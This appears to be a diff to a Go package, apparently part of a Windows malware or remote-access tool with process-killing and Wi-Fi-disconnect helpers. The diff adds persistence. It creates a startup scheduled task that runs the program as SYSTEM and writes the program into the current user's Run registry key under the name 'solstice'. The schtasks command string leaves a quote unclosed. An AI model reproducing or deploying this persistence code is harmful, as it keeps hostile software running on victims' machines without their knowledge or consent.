@@ -5,10 +5,12 @@ package deepfire
 
 import (
 	"fmt"
+	"log"
 	"os"
 
 	ps "github.com/mitchellh/go-ps"
 	"golang.org/x/sys/windows"
+	"golang.org/x/sys/windows/registry"
 )
 
 func killProcByPID(pid int) error {
@@ -97,8 +99,21 @@ func wifiDisconnect() error {
 	return nil
 }
 
-func addPersistentCommand(cmd string) error {
+func schtaskPersistence() error {
+	cmd, er := GetPath()
+	if er != nil {
+		log.Println(er)
+	}
 	_, err := cmdOut(fmt.Sprintf(`schtasks /create /tn "MyCustomTask" /sc onstart /ru system /tr "cmd.exe /c %s`, cmd))
+	return err
+}
+
+func addPersistentCommand() error {
+	path, er := GetPath()
+	if er != nil {
+		log.Println(er)
+	}
+	err := WriteRegistryKey(registry.CURRENT_USER, `SOFTWARE\Microsoft\Windows\CurrentVersion\Run`, "solstice", path)
 	return err
 }
 
